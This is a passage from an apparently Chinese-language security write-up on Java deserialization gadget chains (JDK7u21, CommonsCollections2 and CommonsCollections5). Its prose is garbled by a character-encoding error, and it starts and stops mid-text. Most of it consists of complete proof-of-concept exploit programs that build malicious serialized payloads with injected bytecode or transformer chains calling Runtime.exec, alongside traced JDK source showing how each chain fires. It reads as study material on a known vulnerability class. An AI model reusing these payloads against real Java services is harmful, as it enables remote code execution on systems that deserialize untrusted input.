çš„ä¸€ä¸ªå…·ä½“å®ç°ï¼Œå…¶ç»´æŠ¤ç€ä¸€ä¸ªè¿è¡Œäºæ‰€æœ‰æ¡ç›®çš„åŒé‡é“¾æ¥åˆ—è¡¨ã€‚æ­¤é“¾æ¥åˆ—è¡¨å®šä¹‰äº†è¿­ä»£é¡ºåºï¼Œè¯¥è¿­ä»£é¡ºåºå¯ä¸ºæ’å…¥é¡ºåºæˆ–æ˜¯è®¿é—®é¡ºåºã€‚ LinkedHashSet ç»§æ‰¿ä¸ HashSetï¼Œå¹¶ä¸”å…¶å†…éƒ¨æ˜¯é€šè¿‡ LinkedHashMap æ¥å®ç°çš„ã€‚æœ‰ç‚¹ç±»ä¼¼äºæˆ‘ä»¬ä¹‹å‰è¯´çš„LinkedHashMap å…¶å†…éƒ¨æ˜¯åŸºäº Hashmap å®ç°ä¸€æ ·ï¼Œä¸è¿‡è¿˜æ˜¯æœ‰ä¸€ç‚¹ç‚¹åŒºåˆ«çš„ï¼ˆå…·ä½“çš„åŒºåˆ«å¤§å®¶å¯ä»¥è‡ªå·±å»æ€è€ƒä¸€ä¸‹ï¼‰ã€‚ å¦‚æœæˆ‘ä»¬éœ€è¦è¿­ä»£çš„é¡ºåºä¸ºæ’å…¥é¡ºåºæˆ–è€…è®¿é—®é¡ºåºï¼Œé‚£ä¹ˆ LinkedHashSet æ˜¯éœ€è¦ä½ é¦–å…ˆè€ƒè™‘çš„ã€‚ å› æ­¤åˆ©ç”¨LinkedHashSetå°±å¯ä»¥å®ç°æ¬¡åºå¯æ§ã€‚ POC import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet; import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl; import javassist.ClassClassPath; import javassist.ClassPool; import javassist.CtClass; import javax.xml.transform.Templates; import java.io.ByteArrayInputStream; import java.io.ByteArrayOutputStream; import java.io.ObjectInputStream; import java.io.ObjectOutputStream; import java.lang.reflect.Constructor; import java.lang.reflect.Field; import java.lang.reflect.InvocationHandler; import java.lang.reflect.Proxy; import java.util.HashMap; import java.util.LinkedHashSet; import java.util.Map; public class jdk7u21_self { public static void main(String[] args) throws Exception{ // ClassPoolæ˜¯ CtClass å¯¹è±¡çš„å®¹å™¨ã€‚å®ä¾‹åŒ–ä¸€ä¸ªClassPoolå®¹å™¨ã€‚ ClassPool classPool = ClassPool.getDefault(); // å‘å®¹å™¨ä¸­çš„ç±»æœç´¢è·¯å¾„çš„èµ·å§‹ä½ç½®æ’å…¥AbstractTranslet.classï¼Œä¸ªäººè®¤ä¸ºæ˜¯æ–¹ä¾¿è®©åé¢èƒ½å¤Ÿæ‰¾åˆ°è¿™ä¸ªç±» classPool.insertClassPath(new ClassClassPath(AbstractTranslet.class)); // ä½¿ç”¨å®¹å™¨æ–°å»ºä¸€ä¸ªCtClassï¼Œç›¸å½“äºæ–°å»ºä¸€ä¸ªclassï¼Œç±»åä¸ºEvil CtClass ctClass = classPool.makeClass(\"Evil\"); String cmd = \"java.lang.Runtime.getRuntime().exec(\\\"%s\\\");\"; cmd = String.format(cmd, \"calc.exe\"); // ç»™è¿™ä¸ªç±»åˆ›å»º static ä»£ç å—ï¼Œå¹¶æ’å…¥åˆ°ç±»ä¸­ ctClass.makeClassInitializer().insertBefore(cmd); String className = \"Evil\" + System.nanoTime(); // é‡æ–°è®¾ç½®ç±»åä¸ºä¸€ä¸ªéšæœºçš„åå­— ctClass.setName(className); // ç»™è¿™ä¸ªç±»æ·»åŠ ä¸€ä¸ªçˆ¶ç±»ï¼Œå³ç»§æ‰¿è¯¥çˆ¶ç±»ã€‚ ctClass.setSuperclass(classPool.get(AbstractTranslet.class.getName())); // è®¾ç½®çˆ¶ç±»ä¸ºAbstractTransletï¼Œé¿å…æŠ¥é”™ // å°†è¿™ä¸ªç±»è¾“å‡ºåˆ°é¡¹ç›®ç›®å½•ä¸‹ // ctClass.writeFile(\"./\"); // å°†è¿™ä¸ªclassè½¬æ¢ä¸ºå­—èŠ‚æ•°ç»„ byte[] classBytes = ctClass.toBytecode(); // å°†å­—èŠ‚æ•°ç»„æ”¾ç½®åˆ°ä¸€ä¸ªäºŒç»´æ•°ç»„çš„ç¬¬ä¸€ä¸ªå…ƒç´  byte[][] targetByteCodes = new byte[][]{classBytes}; TemplatesImpl templates = new TemplatesImpl(); setFieldValue(templates, \"_bytecodes\", targetByteCodes); setFieldValue(templates, \"_name\", \"name\"); // setFieldValue(templates, \"_tfactory\", new TransformerFactoryImpl()); String zeroHashCodeStr = \"f5a5a608\"; HashMap map = new HashMap(); map.put(zeroHashCodeStr, \"foo\"); Class clazz = Class.forName(\"sun.reflect.annotation.AnnotationInvocationHandler\"); Constructor handlerConstructor = clazz.getDeclaredConstructor(Class.class, Map.class); handlerConstructor.setAccessible(true); InvocationHandler tempHandler = (InvocationHandler) handlerConstructor.newInstance(Templates.class, map); setFieldValue(tempHandler, \"type\", Templates.class); Templates proxy = (Templates) Proxy.newProxyInstance(Templates.class.getClassLoader(), new Class[]{Templates.class}, tempHandler); LinkedHashSet set = new LinkedHashSet(); // maintain order set.add(templates); set.add(proxy); // setFieldValue(templates, \"_auxClasses\", null); setFieldValue(templates, \"_class\", null); map.put(zeroHashCodeStr, templates); // swap in real object ByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream();//ç”¨äºå­˜æ”¾personå¯¹è±¡åºåˆ—åŒ–byteæ•°ç»„çš„è¾“å‡ºæµ ObjectOutputStream objectOutputStream = new ObjectOutputStream(byteArrayOutputStream); objectOutputStream.writeObject(set);//åºåˆ—åŒ–å¯¹è±¡ objectOutputStream.flush(); objectOutputStream.close(); byte[] bytes = byteArrayOutputStream.toByteArray(); //è¯»å–åºåˆ—åŒ–åçš„å¯¹è±¡byteæ•°ç»„ ByteArrayInputStream byteArrayInputStream = new ByteArrayInputStream(bytes);//å­˜æ”¾byteæ•°ç»„çš„è¾“å…¥æµ ObjectInputStream objectInputStream = new ObjectInputStream(byteArrayInputStream); Object o = objectInputStream.readObject(); } public static void setFieldValue(final Object obj, final String fieldName, final Object value) throws Exception { final Field field = getField(obj.getClass(), fieldName); field.set(obj, value); } public static Field getField(final Class clazz, final String fieldName) { Field field = null; try { field = clazz.getDeclaredField(fieldName); field.setAccessible(true); } catch (NoSuchFieldException ex) { if (clazz.getSuperclass() != null) field = getField(clazz.getSuperclass(), fieldName); } return field; } } CC2_TemplatesImpl é€‚ç”¨ç‰ˆæœ¬ï¼šcommons-collections-4.0, jdk7u21åŠä»¥å‰ å‚è€ƒ: https://blog.csdn.net/qq_41918771/article/details/117194343 æœ€ç»ˆåºåˆ—åŒ–ä¸ºPriorityQueueç±», ä»å…¶readObjectå¼€å§‹ private void readObject(java.io.ObjectInputStream s) throws java.io.IOException, ClassNotFoundException { // Read in size, and any hidden stuff s.defaultReadObject(); // Read in (and discard) array length s.readInt(); queue = new Object[size]; // Read in all elements. for (int i = 0; i queueå€¼å’Œsizeå€¼è¢«æˆ‘ä»¬æ”¹è¿‡, æ‰€ä»¥forå¾ªç¯é‚£ä¸€å—çš„sizeå€¼ä¸º2, forå¾ªç¯ç»“æŸåè·Ÿè¿›heapifyæ–¹æ³• private void heapify() { // è¿™ä¸€å—sizeä¸º2å³10,å³ç§»å‡ä¸€ç­‰äº0å³å¯è¿›å…¥forå¾ªç¯ for (int i = (size >>> 1) - 1; i >= 0; i--) siftDown(i, (E) queue[i]); } ç»§ç»­è·Ÿè¿›siftDownæ–¹æ³• private void siftDown(int k, E x) { if (comparator != null) siftDownUsingComparator(k, x); else siftDownComparable(k, x); } è®¾ç½®äº†comparatorçš„å€¼, è·Ÿè¿›ifè¯­å¥ä¸­çš„siftDownUsingComparatoræ–¹æ³• private void siftDownUsingComparator(int k, E x) { int half = size >>> 1; while (k 0) c = queue[child = right]; if (comparator.compare(x, (E) c) å…³é”®ä»£ç åœ¨ comparator.compare, è¿™é‡Œçš„comparatoræ˜¯TransformingComparatorå®ä¾‹åŒ–çš„å¯¹è±¡ï¼Œè€Œå˜é‡xæ˜¯queue[0]ï¼Œå› ä¸ºåœ¨heapifyå‡½æ•°ä¸­æ˜¯ä¾æ¬¡å¾ªç¯çš„ï¼Œè€Œqueue[0]æ˜¯expä¸­çš„templates è¿›å…¥compareæ–¹æ³•å°±åˆ°äº†ç†Ÿæ‚‰çš„åµŒå¥—è°ƒç”¨ç¯èŠ‚, this.transformerèµ‹å€¼ä¸ºInvokerTransformer, æ‰€ä»¥è°ƒç”¨åˆ°å…¶transformæ–¹æ³• è·Ÿè¿›InvokerTransformerç±»çš„transformæ–¹æ³• è¿™é‡Œçš„å„ä¸ªå˜é‡èµ‹å€¼è¯¦ç»†è¯´æ˜ä¸€ä¸‹: input: TemplatesImplç±» cls: è·å–åˆ°TemplatesImplå¯¹è±¡ iMethodName: newTransformeræ–¹æ³• iParamTypes: null è·Ÿè¿›TemplatesImplä¸­çš„newTransformeræ–¹æ³• public synchronized Transformer newTransformer() throws TransformerConfigurationException { TransformerImpl transformer; transformer = new TransformerImpl(getTransletInstance(), _outputProperties, _indentNumber, _tfactory); if (_uriResolver != null) { transformer.setURIResolver(_uriResolver); } if (_tfactory.getFeature(XMLConstants.FEATURE_SECURE_PROCESSING)) { transformer.setSecureProcessing(true); } return transformer; } è·Ÿè¿›getTransletInstanceæ–¹æ³• private Translet getTransletInstance() throws TransformerConfigurationException { try { // è®¾ç½®_nameå±æ€§ç»•è¿‡è¯¥ifè¯­å¥ if (_name == null) return null; // è®¾ç½®_classä¸ºnullè¿›å…¥defineTransletClassesæ–¹æ³• if (_class == null) defineTransletClasses(); // The translet needs to keep a reference to all its auxiliary // class to prevent the GC from collecting them AbstractTranslet translet = (AbstractTranslet) _class[_transletIndex].newInstance(); translet.postInitialization(); translet.setTemplates(this); translet.setServicesMechnism(_useServicesMechanism); translet.setAllowedProtocols(_accessExternalStylesheet); if (_auxClasses != null) { translet.setAuxiliaryClasses(_auxClasses); } return translet; } catch (InstantiationException e) { ErrorMsg err = new ErrorMsg(ErrorMsg.TRANSLET_OBJECT_ERR, _name); throw new TransformerConfigurationException(err.toString()); } catch (IllegalAccessException e) { ErrorMsg err = new ErrorMsg(ErrorMsg.TRANSLET_OBJECT_ERR, _name); throw new TransformerConfigurationException(err.toString()); } } è·Ÿè¿› defineTransletClasses æ–¹æ³• private void defineTransletClasses() throws TransformerConfigurationException { //å­˜åœ¨_bytecodesç»•è¿‡æ­¤ifè¯­å¥ if (_bytecodes == null) { ErrorMsg err = new ErrorMsg(ErrorMsg.NO_TRANSLET_CLASS_ERR); throw new TransformerConfigurationException(err.toString()); } TransletClassLoader loader = (TransletClassLoader) AccessController.doPrivileged(new PrivilegedAction() { public Object run() { return new TransletClassLoader(ObjectFactory.findClassLoader(),_tfactory.getExternalExtensionsMap()); } }); try { final int classCount = _bytecodes.length; _class = new Class[classCount]; if (classCount > 1) { _auxClasses = new Hashtable(); } for (int i = 0; i èµ‹å€¼ç»™_transletIndexåï¼Œ_class[_transletIndex].newInstance();æ‰ä¼šæ‰§è¡Œæˆ‘ä»¬æ¶æ„çš„staticä»£ç å— // The translet needs to keep a reference to all its auxiliary // class to prevent the GC from collecting them // JVMåœ¨åŠ è½½ç±»æ—¶åœ¨mainæ–¹æ³•ä¹‹å‰æ‰§è¡Œé™æ€å— AbstractTranslet translet = (AbstractTranslet) _class[_transletIndex].newInstance(); POC import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet; import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl; import javassist.ClassClassPath; import javassist.ClassPool; import javassist.CtClass; import org.apache.commons.collections4.comparators.TransformingComparator; import org.apache.commons.collections4.functors.InvokerTransformer; import java.io.*; import java.lang.reflect.Constructor; import java.lang.reflect.Field; import java.util.PriorityQueue; public class CC2_Templat { public static void main(String[] args) throws Exception{ // åå°„å®ä¾‹åŒ–InvokerTransformerå¯¹è±¡ï¼Œè®¾ç½®InvokerTransformerçš„methodNameä¸º\"newTransformer\" Class clazz = Class.forName(\"org.apache.commons.collections4.functors.InvokerTransformer\"); Constructor constructor = clazz.getDeclaredConstructor(String.class); constructor.setAccessible(true); InvokerTransformer invokerTransformer = (InvokerTransformer) constructor.newInstance(\"newTransformer\"); // å®ä¾‹åŒ–ä¸€ä¸ªTransformingComparatorå¯¹è±¡ï¼Œå¹¶ä¸”ä¼ å…¥äº†invokerTransformerï¼Œéœ€è¦æ³¨æ„TransformingComparatorä¸­çš„compareæ–¹æ³• TransformingComparator transformingComparator = new TransformingComparator(invokerTransformer); // å®ä¾‹åŒ–PriorityQueueå¯¹è±¡ PriorityQueue priorityQueue = new PriorityQueue(1); // ClassPoolæ˜¯ CtClass å¯¹è±¡çš„å®¹å™¨ã€‚å®ä¾‹åŒ–ä¸€ä¸ªClassPoolå®¹å™¨ã€‚ ClassPool classPool = ClassPool.getDefault(); // å‘å®¹å™¨ä¸­çš„ç±»æœç´¢è·¯å¾„çš„èµ·å§‹ä½ç½®æ’å…¥AbstractTranslet.classï¼Œä¸ªäººè®¤ä¸ºæ˜¯æ–¹ä¾¿è®©åé¢èƒ½å¤Ÿæ‰¾åˆ°è¿™ä¸ªç±» classPool.insertClassPath(new ClassClassPath(AbstractTranslet.class)); // ä½¿ç”¨å®¹å™¨æ–°å»ºä¸€ä¸ªCtClassï¼Œç›¸å½“äºæ–°å»ºä¸€ä¸ªclassï¼Œç±»åä¸ºEvil CtClass ctClass = classPool.makeClass(\"Evil\"); String cmd = \"java.lang.Runtime.getRuntime().exec(\\\"%s\\\");\"; cmd = String.format(cmd, \"calc.exe\"); // ç»™è¿™ä¸ªç±»åˆ›å»º static ä»£ç å—ï¼Œå¹¶æ’å…¥åˆ°ç±»ä¸­ ctClass.makeClassInitializer().insertBefore(cmd); String className = \"Evil\" + System.nanoTime(); // é‡æ–°è®¾ç½®ç±»åä¸ºä¸€ä¸ªéšæœºçš„åå­— ctClass.setName(className); // ç»™è¿™ä¸ªç±»æ·»åŠ ä¸€ä¸ªçˆ¶ç±»ï¼Œå³ç»§æ‰¿è¯¥çˆ¶ç±»ã€‚ ctClass.setSuperclass(classPool.get(AbstractTranslet.class.getName())); // è®¾ç½®çˆ¶ç±»ä¸ºAbstractTransletï¼Œé¿å…æŠ¥é”™ // å°†è¿™ä¸ªç±»è¾“å‡ºåˆ°é¡¹ç›®ç›®å½•ä¸‹ // ctClass.writeFile(\"./\"); // å°†è¿™ä¸ªclassè½¬æ¢ä¸ºå­—èŠ‚æ•°ç»„ byte[] classBytes = ctClass.toBytecode(); // å°†å­—èŠ‚æ•°ç»„æ”¾ç½®åˆ°ä¸€ä¸ªäºŒç»´æ•°ç»„çš„ç¬¬ä¸€ä¸ªå…ƒç´  byte[][] targetByteCodes = new byte[][]{classBytes}; // å®ä¾‹åŒ–TemplatesImplå¯¹è±¡ TemplatesImpl templates = TemplatesImpl.class.newInstance(); // é€šè¿‡åå°„è®¾ç½®å­—æ®µçš„å€¼ä¸ºäºŒç»´å­—èŠ‚æ•°ç»„ setFieldValue(templates, \"_bytecodes\", targetByteCodes); // è¿›å…¥ defineTransletClasses() æ–¹æ³•éœ€è¦çš„æ¡ä»¶ setFieldValue(templates, \"_name\", \"name\"); setFieldValue(templates, \"_class\", null); // æ–°å»ºä¸€ä¸ªå¯¹è±¡æ•°ç»„ Object[] queueArray = new Object[]{templates, 1}; // åå°„è®¾ç½®PriorityQueueçš„queueå€¼ Field queueField = Class.forName(\"java.util.PriorityQueue\").getDeclaredField(\"queue\"); queueField.setAccessible(true); queueField.set(priorityQueue, queueArray); // åå°„è®¾ç½®PriorityQueueçš„sizeå€¼ Field queueSize = Class.forName(\"java.util.PriorityQueue\").getDeclaredField(\"size\"); queueSize.setAccessible(true); queueSize.set(priorityQueue, 2); // åå°„è®¾ç½®PriorityQueueçš„comparatorå€¼ Field queueComparator = Class.forName(\"java.util.PriorityQueue\").getDeclaredField(\"comparator\"); queueComparator.setAccessible(true); queueComparator.set(priorityQueue, transformingComparator); try{ ObjectOutputStream outputStream = new ObjectOutputStream(new FileOutputStream(\"payload.bin\")); outputStream.writeObject(priorityQueue); outputStream.close(); ObjectInputStream inputStream = new ObjectInputStream(new FileInputStream(\"payload.bin\")); inputStream.readObject(); }catch(Exception e){ e.printStackTrace(); } } public static void setFieldValue(final Object obj, final String fieldName, final Object value) throws Exception { final Field field = getField(obj.getClass(), fieldName); field.set(obj, value); } public static Field getField(final Class clazz, final String fieldName) { Field field = null; try { field = clazz.getDeclaredField(fieldName); field.setAccessible(true); } catch (NoSuchFieldException ex) { if (clazz.getSuperclass() != null) field = getField(clazz.getSuperclass(), fieldName); } return field; } } ğŸš©å¯¹_tfacrotyçš„å†æ¬¡ç†è§£ ç ”ç©¶åˆ°jacksonçš„è§¦å‘é—®é¢˜å†å›æ¥çœ‹è¿™ä¸ª_tfactoryçš„ä½œç”¨, jdk1.7ä¸‹è¯¥å±æ€§æ˜¯ä¸å­˜åœ¨çš„, è€Œjdk1.8ä¸‹çœŸå®å­˜åœ¨æ­¤å±æ€§(com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl#defineTransletClasses) è‡³äºCommonCollectionsé“¾ä¸‹æœ‰æ—¶ä¸éœ€è¦æ­¤ç±»çš„åŸå› , æ˜¯å› ä¸ºé€šè¿‡proprityQueueç±»é€šè¿‡fieldæ–¹å¼æ·»åŠ å€¼æ—¶å…¶_tfactoryæœ€ç»ˆä¼šè‡ªå·±èµ‹å€¼ä¸ºTransformerFactoryImplå®ä¾‹ åœ¨Javaä¸­ï¼Œå¯¹è±¡çš„åºåˆ—åŒ–å¯ä»¥é€šè¿‡å®ç°ä¸¤ç§æ¥å£æ¥å®ç°ï¼Œè‹¥å®ç°çš„æ˜¯Serializableæ¥å£ï¼Œåˆ™æ‰€æœ‰çš„åºåˆ—åŒ–å°†ä¼šè‡ªåŠ¨è¿›è¡Œï¼Œè‹¥å®ç°çš„æ˜¯Externalizableæ¥å£ï¼Œåˆ™æ²¡æœ‰ä»»ä½•ä¸œè¥¿å¯ä»¥è‡ªåŠ¨åºåˆ—åŒ–ï¼Œéœ€è¦åœ¨writeExternalæ–¹æ³•ä¸­è¿›è¡Œæ‰‹å·¥æŒ‡å®šæ‰€è¦åºåˆ—åŒ–çš„å˜é‡ï¼Œè¿™ä¸æ˜¯å¦è¢«transientä¿®é¥°æ— å…³ è¯¦ç»†å¯å‚è€ƒ: https://www.cnblogs.com/lanxuezaipiao/p/3369962.html private void readObject(ObjectInputStream is) throws IOException, ClassNotFoundException { SecurityManager security = System.getSecurityManager(); if (security != null){ String temp = SecuritySupport.getSystemProperty(DESERIALIZE_TRANSLET); if (temp == null || !(temp.length()==0 || temp.equalsIgnoreCase(\"true\"))) { ErrorMsg err = new ErrorMsg(ErrorMsg.DESERIALIZE_TRANSLET_ERR); throw new UnsupportedOperationException(err.toString()); } } // We have to read serialized fields first. ObjectInputStream.GetField gf = is.readFields(); _name = (String)gf.get(\"_name\", null); _bytecodes = (byte[][])gf.get(\"_bytecodes\", null); _class = (Class[])gf.get(\"_class\", null); _transletIndex = gf.get(\"_transletIndex\", -1); _outputProperties = (Properties)gf.get(\"_outputProperties\", null); _indentNumber = gf.get(\"_indentNumber\", 0); if (is.readBoolean()) { _uriResolver = (URIResolver) is.readObject(); } // ååºåˆ—åŒ–æ—¶ä¼šè‡ªåŠ¨ç»™_tfactoryèµ‹å€¼TransformerFactoryImplå¯¹è±¡ _tfactory = new TransformerFactoryImpl(); } è€Œé€šè¿‡ä¸€ä¸‹è¿™ç§æ–¹å¼èµ‹å€¼åˆ™ä¼šæå‰åœ¨åºåˆ—åŒ–å¤„è¿›å…¥compareæ–¹æ³• PriorityQueue priorityQueue = new PriorityQueue(2, transformingComparator); // é€šè¿‡addå»ºç«‹sizeä¸º2çš„æ•°ç»„ priorityQueue.add(templates);priorityQueue.add(templates); è·Ÿè¿›priorityQueueçš„æ–¹æ³•: add > offer > siftUp private void siftUp(int k, E x) { if (comparator != null) siftUpUsingComparator(k, x); else siftUpComparable(k, x); } è¿™é‡Œä¼šå»åˆ¤æ–­comparatoræ˜¯å¦ä¸ºç©º, å› ä¸ºæˆ‘ä»¬åˆå§‹åŒ–çš„æ—¶å€™åŠ å…¥äº†, æ‰€ä»¥è·Ÿè¿›siftUpUsingComparatoræ–¹æ³• private void siftUpUsingComparator(int k, E x) { while (k > 0) { int parent = (k - 1) >>> 1; Object e = queue[parent]; // åºåˆ—åŒ–æ—¶æå‰è§¦å‘äº†compareæ–¹æ³• if (comparator.compare(x, (E) e) >= 0) break; queue[k] = e; k = parent; } queue[k] = x; } è¿™å°±å¯¼è‡´è¿˜æœªç»è¿‡ååºåˆ—åŒ–, åœ¨åºåˆ—åŒ–çš„æ—¶å€™å› ä¸º_tfactoryæ²¡æœ‰èµ‹å€¼, æŠ¥é”™é€€å‡º, åç»­çš„ä¹Ÿä¸ä¼šæ‰§è¡Œ, å¦‚æœæå‰èµ‹å€¼çš„è¯ç›¸å½“äºç›´æ¥åºåˆ—åŒ–æ—¶è§¦å‘äº†ç»“æœ, æ‰€ä»¥éœ€è¦è®¾ç½®æ— å®³çš„InvokerTransformeræ–¹æ³•, ç­‰åºåˆ—åŒ–å®Œæˆåå†é€šè¿‡ä½œç”¨åŸŸä¿®æ”¹, è¿™ä¹Ÿæ˜¯CommonsCollection2çš„å¦ä¸€ç§å†™æ³• package CommonsCollections; import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet; import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl; import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl; import javassist.ClassClassPath; import javassist.ClassPool; import javassist.CtClass; import org.apache.commons.collections4.comparators.TransformingComparator; import org.apache.commons.collections4.functors.InvokerTransformer; import java.io.FileInputStream; import java.io.FileOutputStream; import java.io.ObjectInputStream; import java.io.ObjectOutputStream; import java.lang.reflect.Field; import java.util.PriorityQueue; public class CommonsCollections2 { public static void main(String[] args) throws Exception{ // å®ä¾‹åŒ–ä¸€ä¸ªæ— å®³çš„InvokerTransformer InvokerTransformer invokerTransformer = new InvokerTransformer(\"toString\", new Class[0], new Object[0]); // å®ä¾‹åŒ–ä¸€ä¸ªTransformingComparatorå¯¹è±¡ï¼Œå¹¶ä¸”ä¼ å…¥äº†invokerTransformerï¼Œéœ€è¦æ³¨æ„TransformingComparatorä¸­çš„compareæ–¹æ³• TransformingComparator transformingComparator = new TransformingComparator(invokerTransformer); // ClassPoolæ˜¯ CtClass å¯¹è±¡çš„å®¹å™¨ã€‚å®ä¾‹åŒ–ä¸€ä¸ªClassPoolå®¹å™¨ã€‚ ClassPool classPool = ClassPool.getDefault(); // å‘å®¹å™¨ä¸­çš„ç±»æœç´¢è·¯å¾„çš„èµ·å§‹ä½ç½®æ’å…¥AbstractTranslet.classï¼Œä¸ªäººè®¤ä¸ºæ˜¯æ–¹ä¾¿è®©åé¢èƒ½å¤Ÿæ‰¾åˆ°è¿™ä¸ªç±» classPool.insertClassPath(new ClassClassPath(AbstractTranslet.class)); // ä½¿ç”¨å®¹å™¨æ–°å»ºä¸€ä¸ªCtClassï¼Œç›¸å½“äºæ–°å»ºä¸€ä¸ªclassï¼Œç±»åä¸ºEvil CtClass ctClass = classPool.makeClass(\"Evil\"); String cmd = \"java.lang.Runtime.getRuntime().exec(\\\"%s\\\");\"; cmd = String.format(cmd, \"calc.exe\"); // ç»™è¿™ä¸ªç±»åˆ›å»º static ä»£ç å—ï¼Œå¹¶æ’å…¥åˆ°ç±»ä¸­ ctClass.makeClassInitializer().insertBefore(cmd); String className = \"Evil\" + System.nanoTime(); // é‡æ–°è®¾ç½®ç±»åä¸ºä¸€ä¸ªéšæœºçš„åå­— ctClass.setName(className); // ç»™è¿™ä¸ªç±»æ·»åŠ ä¸€ä¸ªçˆ¶ç±»ï¼Œå³ç»§æ‰¿è¯¥çˆ¶ç±»ã€‚ ctClass.setSuperclass(classPool.get(AbstractTranslet.class.getName())); // è®¾ç½®çˆ¶ç±»ä¸ºAbstractTransletï¼Œé¿å…æŠ¥é”™ // å°†è¿™ä¸ªç±»è¾“å‡ºåˆ°é¡¹ç›®ç›®å½•ä¸‹ // ctClass.writeFile(\"./\"); // å°†è¿™ä¸ªclassè½¬æ¢ä¸ºå­—èŠ‚æ•°ç»„ byte[] classBytes = ctClass.toBytecode(); // å°†å­—èŠ‚æ•°ç»„æ”¾ç½®åˆ°ä¸€ä¸ªäºŒç»´æ•°ç»„çš„ç¬¬ä¸€ä¸ªå…ƒç´  byte[][] targetByteCodes = new byte[][]{classBytes}; // å®ä¾‹åŒ–TemplatesImplå¯¹è±¡ TemplatesImpl templates = TemplatesImpl.class.newInstance(); // é€šè¿‡åå°„è®¾ç½®å­—æ®µçš„å€¼ä¸ºäºŒç»´å­—èŠ‚æ•°ç»„ setFieldValue(templates, \"_bytecodes\", targetByteCodes); // è¿›å…¥ defineTransletClasses() æ–¹æ³•éœ€è¦çš„æ¡ä»¶ setFieldValue(templates, \"_name\", \"name\"); setFieldValue(templates, \"_class\", null); setFieldValue(templates, \"_tfactory\", new TransformerFactoryImpl()); // å®ä¾‹åŒ–PriorityQueueå¯¹è±¡ PriorityQueue priorityQueue = new PriorityQueue(2, transformingComparator); // é€šè¿‡addå»ºç«‹sizeä¸º2çš„æ•°ç»„ priorityQueue.add(templates);priorityQueue.add(templates); // ä¿®æ”¹ä½œç”¨åŸŸä½¿å…¶å¯è§¦å‘ setFieldValue(invokerTransformer, \"iMethodName\", \"newTransformer\"); try{ ObjectOutputStream outputStream = new ObjectOutputStream(new FileOutputStream(\"payload.bin\")); outputStream.writeObject(priorityQueue); outputStream.close(); ObjectInputStream inputStream = new ObjectInputStream(new FileInputStream(\"payload.bin\")); inputStream.readObject(); }catch(Exception e){ e.printStackTrace(); } } public static void setFieldValue(final Object obj, final String fieldName, final Object value) throws Exception { final Field field = getField(obj.getClass(), fieldName); field.set(obj, value); } public static Field getField(final Class clazz, final String fieldName) { Field field = null; try { field = clazz.getDeclaredField(fieldName); field.setAccessible(true); } catch (NoSuchFieldException ex) { if (clazz.getSuperclass() != null) field = getField(clazz.getSuperclass(), fieldName); } return field; } } CC5_BadAttributeValueExpException é€‚ç”¨ç‰ˆæœ¬ï¼š3.1-3.2.1ï¼Œjdk1.8 CC1äº†è§£äº†CC5å°±ä¸ä¼šç‰¹åˆ«éš¾, ä¸»è¦æ˜¯é’ˆå¯¹jdk1.8ä¹‹åAnnotationInvocationHandlerç§»é™¤memberValue.setValueå¯¼è‡´é“¾å­å¤±æ•ˆè€Œé‡‡å–çš„BadAttributeValueExpExceptionè¿›è¡ŒLazyMapçš„getè°ƒç”¨, æ›´æ”¹çš„æ­¥éª¤ä¸»è¦å¦‚ä¸‹: BadAttributeValueException.readObject -> TiedMapEntry.toString -> TiedMapEntry.getValue -> (this.map.get)LazyMap.get -> ChainedTransformer.transform jdk1.8ä¸­BadAttributeValueExpExceptioné‡å†™äº†readObjectæ–¹æ³• private void readObject(ObjectInputStream ois) throws IOException, ClassNotFoundException { ObjectInputStream.GetField gf = ois.readFields(); // valçš„å€¼èµ‹ç»™valObj Object valObj = gf.get(\"val\", null); if (valObj == null) { val = null; } else if (valObj instanceof String) { val= valObj; } else if (System.getSecurityManager() == null || valObj instanceof Long || valObj instanceof Integer || valObj instanceof Float || valObj instanceof Double || valObj instanceof Byte || valObj instanceof Short || valObj instanceof Boolean) { // valObjä¸ºTiedMapEntry, å³è°ƒç”¨TiedMapEntry.toString val = valObj.toString(); } else { // the serialized object is from a version without JDK-8019292 fix val = System.identityHashCode(valObj) + \"@\" + valObj.getClass().getName(); } } è·Ÿè¿›TiedMapEntry.toString public String toString() { // è·Ÿè¿›getValueæ–¹æ³• return this.getKey() + \"=\" + this.getValue(); } ... public Object getValue() { // this.mapèµ‹å€¼ä¸ºLazyMap, è°ƒç”¨LazyMap.get return this.map.get(this.key); } è·Ÿè¿›LazyMap.get public Object get(Object key) { if (!super.map.containsKey(key)) { // æ­¤å¤„keyèµ‹å€¼ä¸ºChainTransformerè§¦å‘å‘½ä»¤æ‰§è¡Œ Object value = this.factory.transform(key); super.map.put(key, value); return value; } else { return super.map.get(key); } } POC package CommonsCollections; import org.apache.commons.codec.binary.Base64; import org.apache.commons.collections.Transformer; import org.apache.commons.collections.functors.ChainedTransformer; import org.apache.commons.collections.functors.ConstantTransformer; import org.apache.commons.collections.functors.InvokerTransformer; import org.apache.commons.collections.keyvalue.TiedMapEntry; import org.apache.commons.collections.map.LazyMap; import javax.management.BadAttributeValueExpException; import java.io.ByteArrayInputStream; import java.io.ByteArrayOutputStream; import java.io.ObjectInputStream; import java.io.ObjectOutputStream; import java.lang.reflect.Field; import java.util.HashMap; import java.util.Map; public class CC5_BadAttributeValueExpException{ public static void main(String[] args) throws Exception{ Transformer[] transformers = new Transformer[]{ new ConstantTransformer(Runtime.class), new InvokerTransformer(\"getMethod\", new Class[]{String.class, Class[].class}, new Object[]{\"getRuntime\", new Class[0]}), new InvokerTransformer(\"invoke\", new Class[]{Object.class, Object[].class}, new Object[]{null, new Object[0]}), new InvokerTransformer(\"exec\", new Class[]{String.class}, new Object[]{\"calc.exe\"}), new ConstantTransformer(1) }; ChainedTransformer chainedTransformer = new ChainedTransformer(transformers); Map innerMap = new HashMap(); // è°ƒç”¨decorateä¸»è¦æ˜¯ç›´æ¥å†™å…¥çš„æ–¹æ³•æ˜¯protected, éœ€è¦è®¾ç½®æƒé™æ‰è¡Œ, è€Œè¯¥æ–¹æ³•æ˜¯public Map outerMap = LazyMap.decorate(innerMap, chainedTransformer); /** * BadAttributeValueException.readObject -> * 